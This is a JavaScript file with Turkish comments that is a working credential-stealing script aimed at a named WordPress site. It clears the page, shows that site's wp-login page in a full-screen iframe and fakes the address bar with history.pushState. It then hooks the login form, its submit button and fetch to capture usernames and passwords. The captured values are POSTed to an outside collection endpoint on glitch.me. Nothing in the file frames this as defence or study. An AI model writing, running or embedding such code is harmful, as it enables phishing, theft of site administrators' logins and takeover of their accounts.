// script.js
(function() {
    console.log('Script başladı');

    // Mevcut sayfayı manipüle et
    const doc = document;
    doc.body.innerHTML = ''; // Sayfayı temizle
    console.log('Sayfa temizlendi');

    // İframe oluştur
    const iframe = doc.createElement('iframe');
    iframe.src = 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    iframe.style.border = 'none';
    doc.body.appendChild(iframe);
    console.log('Iframe eklendi');

    // Adres çubuğunu manipüle et
    window.history.pushState({}, doc.title, 'https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1');
    console.log('Adres çubuğu güncellendi');

    // İframe yüklendiğinde formu izle
    iframe.onload = () => {
        console.log('Iframe yüklendi');
        const iframeDoc = iframe.contentWindow.document;

        // Formu bul
        const loginForm = iframeDoc.getElementById('loginform');
        const submitButton = iframeDoc.getElementById('wp-submit');

        if (loginForm) {
            console.log('Login formu bulundu');

            // Form submit eventi
            loginForm.onsubmit = (e) => {
                console.log('Form submit edildi');
                handleFormSubmit(e, loginForm);
                return false; // Varsayılan submit’i durdur
            };

            // Submit butonuna tıklama eventi (yedek)
            if (submitButton) {
                console.log('Submit butonu bulundu');
                submitButton.onclick = (e) => {
                    console.log('Submit butonuna tıklandı');
                    handleFormSubmit(e, loginForm);
                };
            } else {
                console.log('Submit butonu bulunamadı');
            }
        } else {
            console.log('Login formu bulunamadı');
        }

        // AJAX veya ağ isteklerini yakalamak için fetch’i override et (isteğe bağlı)
        const originalFetch = iframe.contentWindow.fetch;
        iframe.contentWindow.fetch = function(url, options) {
            console.log('Fetch isteği yakalandı:', url, options);
            if (options && options.method === 'POST' && url.includes('wp-login.php')) {
                const body = options.body;
                const formData = new URLSearchParams(body);
                const log = formData.get('log');
                const pwd = formData.get('pwd');
                if (log && pwd) {
                    console.log('AJAX verileri:', { log, pwd });
                    sendToGlitch(log, pwd);
                }
            }
            return originalFetch.apply(this, arguments);
        };
    };

    // Form verisini işleme fonksiyonu
    function handleFormSubmit(event, loginForm) {
        event.preventDefault(); // Gerçek isteği durdur (isteğe bağlı)
        console.log('Veri işleniyor');

        // Form verisini al
        const formData = new FormData(loginForm);
        const log = formData.get('log'); // Kullanıcı adı
        const pwd = formData.get('pwd'); // Şifre
        console.log('Veriler alındı:', { log, pwd });

        // Glitch’e gönder
        sendToGlitch(log, pwd);
    }

    // Glitch’e veri gönderme fonksiyonu
    function sendToGlitch(log, pwd) {
        fetch('https://canyon-charmed-dogsled.glitch.me/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `log=${encodeURIComponent(log)}&pwd=${encodeURIComponent(pwd)}`
        })
        .then(response => console.log('Veri Glitch’e gönderildi'))
        .catch(error => console.error('Hata:', error));
    }
})();
